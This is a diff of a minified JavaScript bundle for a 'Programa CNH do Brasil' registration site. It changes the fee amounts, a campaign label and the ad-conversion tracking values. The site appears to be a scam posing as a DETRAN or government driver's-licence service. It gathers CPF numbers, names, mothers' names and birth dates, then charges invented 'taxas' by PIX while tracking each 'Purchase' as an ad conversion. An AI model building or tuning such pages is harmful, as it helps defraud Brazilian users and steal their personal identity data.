@@ -12930,7 +12930,7 @@ function d3() {
         nome: w.DADOS.nome,
         dataNascimento: w.DADOS.data_nascimento || "",data_nascimento: w.DADOS.data_nascimento || "",
         nomeMae: w.DADOS.nome_mae || ""
-      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:66.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:66.20});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
+      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"ECOM 02",currency:"BRL",value:68.70});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"ECOM 02",currency:"BRL",value:68.70});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
     } catch (h) {
       console.error("Error fetching data:", h);
       const w = {
@@ -14896,13 +14896,13 @@ function gp() {
     if (m) try { const A = JSON.parse(m); b = A.email || ""; C = A.phone || "" } catch (A) { console.error("Error parsing userData:", A) }
     if (typeof window.fbq < "u") try {
       window.fbq("track", "Purchase", {
-        value: 66.20,
+        value: 68.70,
         currency: "BRL",
-        content_name: "LOJA SHOPIFY BR",
+        content_name: "ECOM 02",
         content_type: "product"
       }), console.log("Facebook Pixel: Purchase tracked")
     } catch (A) { console.error("Facebook Pixel error:", A) }
-    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 66.20, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
+    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 68.70, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
     localStorage.setItem(p, new Date().toISOString())
   }, []), x.useEffect(() => {
     if (v.current) return;
@@ -14929,7 +14929,7 @@ function gp() {
           body: JSON.stringify({
             nome: C.nome,
             cpf: C.cpf,
-            valor: 66.20,
+            valor: 68.70,
             email: C.email || "",
             telefone: C.phone || "",
             detran: j
@@ -14956,7 +14956,7 @@ function gp() {
                 "Content-Type": "application/json"
               },
               body: JSON.stringify({
-                amount: 72.40,
+                amount: 81.40,
                 customer_name: b.nome,
                 customer_email: b.email || "cliente@email.com",
                 customer_phone: b.phone || "11999999999",
@@ -15041,7 +15041,7 @@ function gp() {
               children: l.jsxs("div", {
                 children: [l.jsx("p", {
                   className: "font-bold text-green-800 mb-2",
-                  children: "✅ Cadastro realizado na LOJA SHOPIFY BR!"
+                  children: "✅ Cadastro realizado na ECOM 02!"
                 }), l.jsx("p", {
                   className: "text-green-700 text-sm",
                   children: "Em até 5 dias úteis nossa equipe entrará em contato com você pelo número cadastrado para dar continuidade ao seu processo."
@@ -15095,7 +15095,7 @@ function gp() {
                 }), " para finalizar seu cadastro no Programa CNH do Brasil"]
               }), l.jsxs("li", {
                 children: ["• Valor único de ", l.jsx("strong", {
-                  children: "R$ 72,40"
+                  children: "R$ 81,40"
                 }), " pago uma única vez"]
               }), l.jsx("li", {
                 children: "• Taxa destinada ao processo de emissão e regularização da CNH"
@@ -15122,7 +15122,7 @@ function gp() {
             className: "text-center mb-6",
             children: [l.jsx("p", {
               className: "text-3xl font-bold text-green-600",
-              children: "R$ 72,40"
+              children: "R$ 81,40"
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Taxa única de emissão"
@@ -15221,7 +15221,7 @@ function gp() {
                 }), l.jsx("li", {
                   children: "3. Escaneie o QR Code ou cole o código PIX"
                 }), l.jsx("li", {
-                  children: "4. Confirme o pagamento de R$ 72,40"
+                  children: "4. Confirme o pagamento de R$ 81,40"
                 })]
               })]
             }), t && l.jsx("div", {
@@ -21139,7 +21139,7 @@ function kE() {
       return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
     },
     f = h => {
-      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"LOJA SHOPIFY BR",currency:"BRL",value:66.20,num_items:1});}}catch(e){}})(); e("/chat")
+      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"ECOM 02",currency:"BRL",value:68.70,num_items:1});}}catch(e){}})(); e("/chat")
     };
   return l.jsxs("div", {
     children: [l.jsx(rt, {}), l.jsx("div", {
@@ -21401,9 +21401,9 @@ function DE() {
           console.log("PAGAMENTO CONFIRMADO!");
           const I = `fb_conversion_${M}`;
           return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
-            value: (t == null ? void 0 : t.amount) || 66.20,
+            value: (t == null ? void 0 : t.amount) || 68.70,
             currency: "BRL",
-            content_name: "LOJA SHOPIFY BR",
+            content_name: "ECOM 02",
             content_type: "product",
             content_ids: [M],
             transaction_id: M
@@ -21439,7 +21439,7 @@ function DE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 66.20,
+            amount: 68.70,
             customer_name: _.nome,
             customer_email: _.email,
             customer_phone: _.phone,
@@ -22089,7 +22089,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
             const ge = window.fbq;
             ge("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 66.20,
+              value: (m == null ? void 0 : m.amount) || 68.70,
               currency: "BRL",
               content_type: "product",
               content_ids: [B],
@@ -22114,7 +22114,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
             const Y = window.fbq;
             Y("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 66.20,
+              value: (m == null ? void 0 : m.amount) || 68.70,
               currency: "BRL",
               content_type: "product",
               content_ids: [m.deposit_id],
@@ -22209,9 +22209,9 @@ function OE() {
     const Y = "fb_addtocart_chat_tracked";
     if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
       window.fbq("track", "AddToCart", {
-        value: 66.20,
+        value: 68.70,
         currency: "BRL",
-        content_name: "LOJA SHOPIFY BR",
+        content_name: "ECOM 02",
         content_type: "product"
       }), localStorage.setItem(Y, new Date().toISOString())
     } catch (ge) {
@@ -22246,7 +22246,7 @@ function OE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 66.20,
+            amount: 68.70,
             customer_name: ge.nome,
             customer_email: ge.email || "cliente@email.com",
             customer_phone: ge.phone || "11999999999",
@@ -22303,9 +22303,9 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
 
 • Taxa de Expedição de Documento (TED): R$ 17,00
 • Taxa de Serviços Administrativos (TSA): R$ 21,50
-• Taxa de Processamento Eletrônico (TPE): R$ 27,70
+• Taxa de Processamento Eletrônico (TPE): R$ 30,20
 
-Valor Total: R$ 66,20`, 3e3), i("finalize_button")
+Valor Total: R$ 68,70`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22968,14 +22968,14 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "27,70"
+                      children: "30,20"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "66,20"
+                      children: "68,70"
                     })]
                   })]
                 })]
@@ -23275,7 +23275,7 @@ function VE() {
         if (typeof window < "u" && window.fbq) {
           const P = window.fbq;
           P("track", "Purchase", {
-            value: parseFloat((r == null ? void 0 : r.amount) || "66.20"),
+            value: parseFloat((r == null ? void 0 : r.amount) || "68.70"),
             currency: "BRL",
             content_type: "product",
             content_ids: [C],
